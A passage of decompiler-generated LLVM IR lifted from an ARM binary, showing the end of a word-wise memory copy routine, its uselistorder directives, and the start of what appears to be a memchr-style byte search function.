  store i32 %v3_19cc8, i32* @r3, align 4
  store i32 %v1_19cc8, i32* %r1.global-to-local, align 4
  %v4_19ccc = udiv i32 %v3_19cc8, 65536
  %v5_19ccc = or i32 %v4_19ccc, %v3_19cc4
  store i32 %v5_19ccc, i32* @ip, align 4
  %v2_19cd0 = add i32 %v1_19cd0, -4
  %v3_19cd0 = inttoptr i32 %v2_19cd0 to i32*
  store i32 %v5_19ccc, i32* %v3_19cd0, align 4
  %v4_19cd0 = load i32, i32* %r0.global-to-local, align 4
  %v5_19cd0 = add i32 %v4_19cd0, -4
  store i32 %v5_19cd0, i32* %r0.global-to-local, align 4
  %v0_19cd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_19cd4 = add i32 %v0_19cd4, -4
  store i32 %v2_19cd4, i32* %r2.global-to-local, align 4
  %v6_19cd8 = icmp slt i32 %v0_19cd4, 4
  br i1 %v6_19cd8, label %dec_label_pc_19cdc.loopexit, label %dec_label_pc_19cc4

dec_label_pc_19cdc.loopexit:                      ; preds = %dec_label_pc_19cc4
  %v4_19cd4 = sub i32 3, %v0_19cd4
  %v5_19cd4 = and i32 %v4_19cd4, %v0_19cd4
  %v6_19cd4 = icmp slt i32 %v5_19cd4, 0
  %v7_19cd4 = icmp slt i32 %v2_19cd4, 0
  store i1 %v6_19cd4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19cd4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19cdc

dec_label_pc_19cdc:                               ; preds = %dec_label_pc_19cdc.loopexit, %dec_label_pc_19cb8
  %v2_19bb451 = phi i32 [ %v5_19cd0, %dec_label_pc_19cdc.loopexit ], [ %v1_19cac, %dec_label_pc_19cb8 ]
  %v0_19ba447 = phi i32 [ %v2_19cd4, %dec_label_pc_19cdc.loopexit ], [ %v2_19cbc, %dec_label_pc_19cb8 ]
  %v0_19cdc = load i32, i32* %r1.global-to-local, align 4
  %v1_19cdc = add i32 %v0_19cdc, 2
  store i32 %v1_19cdc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19ce4:                               ; preds = %dec_label_pc_19bf8
  br i1 %v5_19ce8, label %dec_label_pc_19d30, label %dec_label_pc_19cec

dec_label_pc_19cec:                               ; preds = %dec_label_pc_19ce4
  store i32 %v2_19ce4, i32* %r2.global-to-local, align 4
  %v3_19cf0 = load i32, i32* @r4, align 4
  store i32 %v3_19cf0, i32* %stack_var_-12, align 4
  %v6_19cf0 = load i32, i32* @r5, align 4
  %v8_19cf0 = inttoptr i32 %v6_19cf0 to i8*
  store i8* %v8_19cf0, i8** %stack_var_-8, align 4
  %v11_19cf0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19cf4

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge, %dec_label_pc_19cec
  %v0_19d18 = phi i32 [ %v1_19d18, %dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge ], [ %v0_19c4018, %dec_label_pc_19cec ]
  %v0_19cf8 = phi i32 [ %v0_19cf8.pre, %dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge ], [ %v1_19bf8, %dec_label_pc_19cec ]
  %v0_19cf4 = phi i32 [ %v0_19cf4.pre, %dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge ], [ %v2_19bfc, %dec_label_pc_19cec ]
  %v3_19cf4 = mul i32 %v0_19cf4, 16777216
  store i32 %v3_19cf4, i32* %lr.global-to-local, align 4
  %v1_19cf8 = add i32 %v0_19cf8, -4
  %v2_19cf8 = inttoptr i32 %v1_19cf8 to i32*
  %v3_19cf8 = load i32, i32* %v2_19cf8, align 4
  store i32 %v3_19cf8, i32* @r3, align 4
  %v4_19cf8 = add i32 %v0_19cf8, -8
  %v5_19cf8 = inttoptr i32 %v4_19cf8 to i32*
  %v6_19cf8 = load i32, i32* %v5_19cf8, align 4
  store i32 %v6_19cf8, i32* %r4.global-to-local, align 4
  %v7_19cf8 = add i32 %v0_19cf8, -12
  %v8_19cf8 = inttoptr i32 %v7_19cf8 to i32*
  %v9_19cf8 = load i32, i32* %v8_19cf8, align 4
  store i32 %v9_19cf8, i32* %r5.global-to-local, align 4
  %v10_19cf8 = add i32 %v0_19cf8, -16
  %v11_19cf8 = inttoptr i32 %v10_19cf8 to i32*
  %v12_19cf8 = load i32, i32* %v11_19cf8, align 4
  store i32 %v10_19cf8, i32* %r1.global-to-local, align 4
  %v4_19cfc = udiv i32 %v12_19cf8, 256
  %v5_19cfc = or i32 %v4_19cfc, %v3_19cf4
  store i32 %v5_19cfc, i32* %lr.global-to-local, align 4
  %v3_19d00 = mul i32 %v12_19cf8, 16777216
  %v4_19d04 = udiv i32 %v9_19cf8, 256
  %v5_19d04 = or i32 %v3_19d00, %v4_19d04
  store i32 %v5_19d04, i32* @ip, align 4
  %v3_19d08 = mul i32 %v9_19cf8, 16777216
  %v4_19d0c = udiv i32 %v6_19cf8, 256
  %v5_19d0c = or i32 %v3_19d08, %v4_19d0c
  store i32 %v5_19d0c, i32* %r5.global-to-local, align 4
  %v3_19d10 = mul i32 %v6_19cf8, 16777216
  %v4_19d14 = udiv i32 %v3_19cf8, 256
  %v5_19d14 = or i32 %v3_19d10, %v4_19d14
  store i32 %v5_19d14, i32* %r4.global-to-local, align 4
  %v1_19d18 = add i32 %v0_19d18, -16
  %v2_19d18 = inttoptr i32 %v1_19d18 to i32*
  store i32 %v5_19d14, i32* %v2_19d18, align 4
  %v4_19d18 = add i32 %v0_19d18, -12
  %v5_19d18 = inttoptr i32 %v4_19d18 to i32*
  %v6_19d18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_19d18, i32* %v5_19d18, align 4
  %v7_19d18 = add i32 %v0_19d18, -8
  %v8_19d18 = inttoptr i32 %v7_19d18 to i32*
  %v9_19d18 = load i32, i32* @ip, align 4
  store i32 %v9_19d18, i32* %v8_19d18, align 4
  %v10_19d18 = add i32 %v0_19d18, -4
  %v11_19d18 = inttoptr i32 %v10_19d18 to i32*
  %v12_19d18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19d18, i32* %v11_19d18, align 4
  store i32 %v1_19d18, i32* %r0.global-to-local, align 4
  %v0_19d1c = load i32, i32* %r2.global-to-local, align 4
  %v2_19d1c = add i32 %v0_19d1c, -16
  store i32 %v2_19d1c, i32* %r2.global-to-local, align 4
  %v6_19d20 = icmp slt i32 %v0_19d1c, 16
  br i1 %v6_19d20, label %dec_label_pc_19d24, label %dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge

dec_label_pc_19cf4.dec_label_pc_19cf4_crit_edge:  ; preds = %dec_label_pc_19cf4
  %v0_19cf4.pre = load i32, i32* @r3, align 4
  %v0_19cf8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19cf4

dec_label_pc_19d24:                               ; preds = %dec_label_pc_19cf4
  %v2_19d24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19d24, i32* @r4, align 4
  %v5_19d24 = load i8*, i8** %stack_var_-8, align 4
  %v6_19d24 = ptrtoint i8* %v5_19d24 to i32
  store i32 %v6_19d24, i32* @r5, align 4
  store i32 %v11_19cf0, i32* @lr, align 4
  %v2_19d28 = add i32 %v0_19d1c, -4
  store i32 %v2_19d28, i32* %r2.global-to-local, align 4
  %v4_19d28 = add i32 %v0_19d1c, 2147483632
  %v5_19d28 = and i32 %v2_19d28, %v4_19d28
  %v6_19d28 = icmp slt i32 %v5_19d28, 0
  store i1 %v6_19d28, i1* %cpsr_v.global-to-local, align 1
  %v7_19d28 = icmp slt i32 %v2_19d28, 0
  store i1 %v7_19d28, i1* %cpsr_n.global-to-local, align 1
  %v8_19d28 = icmp eq i32 %v2_19d28, 0
  store i1 %v8_19d28, i1* %cpsr_z.global-to-local, align 1
  %v5_19d2c = icmp slt i32 %v2_19d1c, -12
  br i1 %v5_19d2c, label %dec_label_pc_19d48, label %dec_label_pc_19d30

dec_label_pc_19d30:                               ; preds = %dec_label_pc_19d24, %dec_label_pc_19ce4, %dec_label_pc_19d30
  %v1_19d3c = phi i32 [ %v5_19d3c, %dec_label_pc_19d30 ], [ %v1_19d18, %dec_label_pc_19d24 ], [ %v0_19c4018, %dec_label_pc_19ce4 ]
  %v0_19d30 = load i32, i32* @r3, align 4
  %v3_19d30 = mul i32 %v0_19d30, 16777216
  store i32 %v3_19d30, i32* %ip.global-to-local, align 4
  %v0_19d34 = load i32, i32* %r1.global-to-local, align 4
  %v1_19d34 = add i32 %v0_19d34, -4
  %v2_19d34 = inttoptr i32 %v1_19d34 to i32*
  %v3_19d34 = load i32, i32* %v2_19d34, align 4
  store i32 %v3_19d34, i32* @r3, align 4
  store i32 %v1_19d34, i32* %r1.global-to-local, align 4
  %v4_19d38 = udiv i32 %v3_19d34, 256
  %v5_19d38 = or i32 %v4_19d38, %v3_19d30
  store i32 %v5_19d38, i32* @ip, align 4
  %v2_19d3c = add i32 %v1_19d3c, -4
  %v3_19d3c = inttoptr i32 %v2_19d3c to i32*
  store i32 %v5_19d38, i32* %v3_19d3c, align 4
  %v4_19d3c = load i32, i32* %r0.global-to-local, align 4
  %v5_19d3c = add i32 %v4_19d3c, -4
  store i32 %v5_19d3c, i32* %r0.global-to-local, align 4
  %v0_19d40 = load i32, i32* %r2.global-to-local, align 4
  %v2_19d40 = add i32 %v0_19d40, -4
  store i32 %v2_19d40, i32* %r2.global-to-local, align 4
  %v6_19d44 = icmp slt i32 %v0_19d40, 4
  br i1 %v6_19d44, label %dec_label_pc_19d48.loopexit, label %dec_label_pc_19d30

dec_label_pc_19d48.loopexit:                      ; preds = %dec_label_pc_19d30
  %v4_19d40 = sub i32 3, %v0_19d40
  %v5_19d40 = and i32 %v4_19d40, %v0_19d40
  %v6_19d40 = icmp slt i32 %v5_19d40, 0
  %v7_19d40 = icmp slt i32 %v2_19d40, 0
  store i1 %v6_19d40, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19d40, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19d48

dec_label_pc_19d48:                               ; preds = %dec_label_pc_19d48.loopexit, %dec_label_pc_19d24
  %v2_19bb452 = phi i32 [ %v5_19d3c, %dec_label_pc_19d48.loopexit ], [ %v1_19d18, %dec_label_pc_19d24 ]
  %v0_19ba448 = phi i32 [ %v2_19d40, %dec_label_pc_19d48.loopexit ], [ %v2_19d28, %dec_label_pc_19d24 ]
  %v0_19d48 = load i32, i32* %r1.global-to-local, align 4
  %v1_19d48 = add i32 %v0_19d48, 1
  store i32 %v1_19d48, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_19d3c, { 0, 2, 1 }
  uselistorder i32 %v3_19d30, { 1, 0 }
  uselistorder i32 %v2_19d28, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19d18, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19cf8, { 1, 0 }
  uselistorder i32 %v3_19cf4, { 1, 0 }
  uselistorder i32 %v0_19cf8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19d18, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19cd0, { 0, 2, 1 }
  uselistorder i32 %v3_19cc4, { 1, 0 }
  uselistorder i32 %v2_19cbc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19cac, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19c8c, { 1, 0 }
  uselistorder i32 %v3_19c88, { 1, 0 }
  uselistorder i32 %v0_19c8c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19cac, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19c64, { 0, 2, 1 }
  uselistorder i32 %v3_19c58, { 1, 0 }
  uselistorder i32 %v2_19c50, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19c40, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19c20, { 1, 0 }
  uselistorder i32 %v3_19c1c, { 1, 0 }
  uselistorder i32 %v0_19c20, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19c40, { 3, 2, 1, 0 }
  uselistorder i1 %v5_19ce8, { 2, 0, 1 }
  uselistorder i32 %v0_19c00, { 1, 0 }
  uselistorder i32 %v0_19cec, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_19c4018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_19bf0, { 2, 1, 0 }
  uselistorder i32 %v0_19bf0, { 2, 0, 1 }
  uselistorder i32 %v2_19be8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_19be8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19be8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_19c4019, { 2, 1, 0 }
  uselistorder i32 %v11_19bc4, { 1, 0 }
  uselistorder i32 %v7_19bc4, { 1, 0 }
  uselistorder i32 %v1_19ba4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_19ba4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_19ba8, { 1, 0 }
  uselistorder i32 %v7_19b9c, { 0, 2, 1 }
  uselistorder i32 %v10_19b98, { 1, 0 }
  uselistorder i32 %v9_19b90, { 1, 0, 2 }
  uselistorder i32 %v6_19b8c, { 1, 0 }
  uselistorder i32 %v2_19b84, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_19b84, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_19b94, { 0, 3, 2, 1 }
  uselistorder i32 %v7_19b78, { 0, 2, 1 }
  uselistorder i32 %v13_19b74, { 1, 0 }
  uselistorder i32 %v4_19b70, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_19b70, { 2, 0, 1 }
  uselistorder i32 %v6_19b78, { 0, 3, 2, 1 }
  uselistorder i32 %v7_19b68, { 0, 2, 1 }
  uselistorder i32 %v16_19b64, { 1, 0 }
  uselistorder i32 %v4_19b60, { 1, 2, 0 }
  uselistorder i32 %v0_19b70.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_19b68, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_19b54, { 0, 3, 2, 1 }
  uselistorder i32 %v10_19b50, { 1, 0 }
  uselistorder i32 %v1_19b4c, { 1, 0 }
  uselistorder i32 %v10_19b48, { 1, 0 }
  uselistorder i32 %v0_19b48, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19b4c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_19b40, { 0, 2, 1 }
  uselistorder i32 %v2_19b34, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_19b34, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_19b4c36, { 1, 2, 0 }
  uselistorder i32 %v1_19b2c, { 2, 1, 0 }
  uselistorder i32 %v1_19b24, { 2, 3, 1, 0 }
  uselistorder i32 %v2_19b1c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_19b18, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_19b14, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_19b14, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_19b04, { 0, 2, 1 }
  uselistorder i32 %v4_19b00, { 1, 0 }
  uselistorder i32 %v3_19af4, { 1, 0 }
  uselistorder i32 %v1_19aec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19ae0, { 1, 0 }
  uselistorder i32 %v12_19adc, { 0, 2, 1 }
  uselistorder i32 %v8_19abc, { 1, 0, 2 }
  uselistorder i32 %v5_19abc, { 1, 0, 2 }
  uselistorder i32 %v2_19abc, { 1, 0, 2 }
  uselistorder i32 %v0_19abc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19adc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_19a98, { 0, 2, 1 }
  uselistorder i32 %v4_19a94, { 1, 0 }
  uselistorder i32 %v3_19a88, { 1, 0 }
  uselistorder i32 %v1_19a80, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19a74, { 1, 0 }
  uselistorder i32 %v12_19a70, { 0, 2, 1 }
  uselistorder i32 %v8_19a50, { 1, 0, 2 }
  uselistorder i32 %v5_19a50, { 1, 0, 2 }
  uselistorder i32 %v2_19a50, { 1, 0, 2 }
  uselistorder i32 %v0_19a50, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19a70, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_19a2c, { 0, 2, 1 }
  uselistorder i32 %v4_19a28, { 1, 0 }
  uselistorder i32 %v3_19a1c, { 1, 0 }
  uselistorder i32 %v1_19a14, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19a08, { 1, 0 }
  uselistorder i32 %v12_19a04, { 0, 2, 1 }
  uselistorder i32 %v8_199e4, { 1, 0, 2 }
  uselistorder i32 %v5_199e4, { 1, 0, 2 }
  uselistorder i32 %v2_199e4, { 1, 0, 2 }
  uselistorder i32 %v0_199e4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19a04, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_19a40, { 0, 2, 1 }
  uselistorder i32 %v1_19a3c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_199c0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_199c0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19a44, { 1, 0, 3, 2 }
  uselistorder i32 %v0_19adc75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_199b4, { 1, 0 }
  uselistorder i32 %v0_199b4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_199ac, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_199ac, { 1, 0, 2 }
  uselistorder i32 %v0_199ac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19adc76, { 1, 0 }
  uselistorder i32 %v1_1998c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_19994, { 1, 0 }
  uselistorder i32 %v0_19968, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1995c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_19948, { 1, 0, 2 }
  uselistorder i32 %v1_19944, { 1, 0 }
  uselistorder i32 %v1_1993c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1993c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19934, { 0, 2, 1 }
  uselistorder i32 %v3_19934, { 3, 0, 1, 2 }
  uselistorder i1 %v0_19934, { 1, 0 }
  uselistorder i1 %v1_19934, { 1, 0 }
  uselistorder i32 %v3_19930, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_19928, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19914, { 1, 2, 0 }
  uselistorder i32 %v1_1990c, { 0, 2, 1 }
  uselistorder i32 %v12_19908, { 0, 1, 3, 2 }
  uselistorder i32 %v0_198fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19900, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_198f0, { 0, 2, 1 }
  uselistorder i32 %v1_198e8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_198e8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_198e0, { 1, 0 }
  uselistorder i32 %v1_198d8, { 2, 1, 0 }
  uselistorder i32 %v2_198d0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_198d0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_198cc, { 1, 0 }
  uselistorder i32 %v2_198c0, { 1, 0 }
  uselistorder i32 %v1_198c0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_198c0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 0, 47, 1, 2, 3, 4, 5, 48, 6, 7, 8, 9, 10, 49, 11, 12, 45, 46, 50, 27, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 67, 30, 31, 32, 33, 34, 68, 35, 36, 37, 38, 39, 69, 40, 41, 42, 43, 44, 70, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 71 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 2, 53, 5, 6, 8, 9, 7, 54, 10, 11, 13, 50, 12, 55, 51, 52, 56, 59, 57, 63, 64, 14, 15, 16, 18, 17, 19, 20, 58, 21, 22, 60, 23, 61, 24, 62, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 42, 40, 47, 43, 44, 48, 49, 69, 65, 67, 66, 68, 70, 75, 71, 73, 72, 74, 76, 82, 77, 78, 83, 79, 84, 80, 85, 81, 86, 87, 88, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 30, 3, 4, 31, 5, 6, 32, 7, 29, 35, 36, 8, 9, 21, 10, 12, 11, 13, 14, 33, 15, 16, 34, 17, 18, 19, 20, 22, 23, 39, 24, 25, 40, 26, 27, 41, 28, 37, 42, 38, 43, 44, 46, 45, 47, 48, 50, 49, 51, 52, 58, 59, 53, 54, 55, 60, 56, 57, 61, 62, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 27, 28, 29, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 29, 4, 0, 6, 1, 7, 5, 27, 28, 8, 9, 10, 11, 12, 13, 14, 15, 31, 16, 17, 18, 19, 20, 30, 21, 2, 22, 3, 24, 23, 25, 26, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 26, 4, 0, 6, 1, 7, 5, 25, 8, 9, 10, 11, 12, 13, 14, 15, 16, 28, 17, 18, 19, 27, 20, 2, 21, 3, 23, 22, 24, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 30, 4, 0, 6, 1, 7, 5, 28, 29, 8, 9, 10, 11, 12, 13, 14, 15, 16, 32, 17, 18, 19, 20, 21, 31, 22, 2, 23, 3, 25, 24, 26, 27, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19d30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19c58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19bf8, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_19b84, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_19b48, { 1, 0 }
  uselistorder label %dec_label_pc_19b34, { 1, 0 }
  uselistorder label %dec_label_pc_19af4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19a88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_199bc, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1998c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_19928, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_198e8, { 1, 0 }
}

define i32 @function_19d50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_19d50:
  %v1_19d54 = urem i32 %arg1, 256
  %v0_19d70.pr = load i32, i32* @r2, align 4
  %v2_19d7015 = icmp eq i32 %v0_19d70.pr, 0
  %v0_19d84.pre = load i32, i32* @r0, align 4
  br i1 %v2_19d7015, label %dec_label_pc_19d80, label %dec_label_pc_19d78

dec_label_pc_19d5c:                               ; preds = %dec_label_pc_19d78
  %v1_19d5c = inttoptr i32 %v0_19d6c to i8*
  %v2_19d5c = load i8, i8* %v1_19d5c, align 1
  %v3_19d5c = zext i8 %v2_19d5c to i32
  %v9_19d60 = icmp eq i32 %v3_19d5c, %v1_19d54
  br i1 %v9_19d60, label %dec_label_pc_19e30, label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19d5c
  %v1_19d68 = add i32 %v0_19d68, -1
  %v1_19d6c = add i32 %v0_19d6c, 1
  %v2_19d70 = icmp eq i32 %v1_19d68, 0
  br i1 %v2_19d70, label %dec_label_pc_19d80, label %dec_label_pc_19d78

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d50, %dec_label_pc_19d68
  %v0_19d68 = phi i32 [ %v1_19d68, %dec_label_pc_19d68 ], [ %v0_19d70.pr, %dec_label_pc_19d50 ]
  %v0_19d6c = phi i32 [ %v1_19d6c, %dec_label_pc_19d68 ], [ %v0_19d84.pre, %dec_label_pc_19d50 ]
  %v1_19d78 = urem i32 %v0_19d6c, 4
  %v2_19d78 = icmp eq i32 %v1_19d78, 0
  br i1 %v2_19d78, label %dec_label_pc_19d80, label %dec_label_pc_19d5c

dec_label_pc_19d80:                               ; preds = %dec_label_pc_19d68, %dec_label_pc_19d78, %dec_label_pc_19d50
  %v0_19dfc22 = phi i32 [ 0, %dec_label_pc_19d50 ], [ 0, %dec_label_pc_19d68 ], [ %v0_19d68, %dec_label_pc_19d78 ]
  %v0_19d84 = phi i32 [ %v0_19d84.pre, %dec_label_pc_19d50 ], [ %v1_19d6c, %dec_label_pc_19d68 ], [ %v0_19d6c, %dec_label_pc_19d78 ]
  %v4_19d80 = mul nuw nsw i32 %v1_19d54, 256
  %v5_19d80 = or i32 %v4_19d80, %v1_19d54
  %v4_19d88 = mul i32 %v5_19d80, 65536
  %v5_19d88 = or i32 %v4_19d88, %v5_19d80
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_19dfc22, 3
  br i1 %tmp, label %dec_label_pc_19d90, label %dec_label_pc_19e24.preheader

dec_label_pc_19d90:                               ; preds = %dec_label_pc_19d80, %dec_label_pc_19dfc.backedge
  %v0_19dac60 = phi i32 [ %v1_19dac, %dec_label_pc_19dfc.backedge ], [ %v0_19dfc22, %dec_label_pc_19d80 ]
  %v0_19dd059 = phi i32 [ %v4_19d90, %dec_label_pc_19dfc.backedge ], [ %v0_19d84, %dec_label_pc_19d80 ]
  %v1_19d90 = inttoptr i32 %v0_19dd059 to i32*
  %v2_19d90 = load i32, i32* %v1_19d90, align 4
  %v4_19d90 = add i32 %v0_19dd059, 4
  %v2_19d94 = xor i32 %v2_19d90, %v5_19d88
  %v2_19d98 = add i32 %v2_19d94, 2130640639
  %v1_19d9c = sub i32 -1, %v2_19d94
  %v2_19da0 = xor i32 %v2_19d98, %v1_19d9c
  %v2_19da4 = and i32 %v2_19da0, -2130640640
  %v2_19da8 = icmp eq i32 %v2_19da4, 0
  %v1_19dac = add i32 %v0_19dac60, -4
  br i1 %v2_19da8, label %dec_label_pc_19dfc.backedge, label %dec_label_pc_19db4

dec_label_pc_19dfc.backedge:                      ; preds = %dec_label_pc_19d90, %dec_label_pc_19dec
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_19dac, 3
  br i1 %tmp73, label %dec_label_pc_19d90, label %dec_label_pc_19e24.preheader

dec_label_pc_19db4:                               ; preds = %dec_label_pc_19d90
  %v2_19db4 = inttoptr i32 %v0_19dd059 to i8*
  %v3_19db4 = load i8, i8* %v2_19db4, align 1
  %v4_19db4 = zext i8 %v3_19db4 to i32
  %v9_19dbc = icmp eq i32 %v4_19db4, %v1_19d54
  %v1_19dc0 = add i32 %v0_19dd059, 3
  store i32 %v1_19dc0, i32* @ip, align 4
  br i1 %v9_19dbc, label %dec_label_pc_19e30, label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db4
  %v1_19dc8 = add i32 %v0_19dd059, 1
  %v2_19dc8 = inttoptr i32 %v1_19dc8 to i8*
  %v3_19dc8 = load i8, i8* %v2_19dc8, align 1
  %v4_19dc8 = zext i8 %v3_19dc8 to i32
  %v9_19dcc = icmp eq i32 %v4_19dc8, %v1_19d54
  br i1 %v9_19dcc, label %bb, label %dec_label_pc_19ddc

bb:                                               ; preds = %dec_label_pc_19dc8
  br label %dec_label_pc_19e30

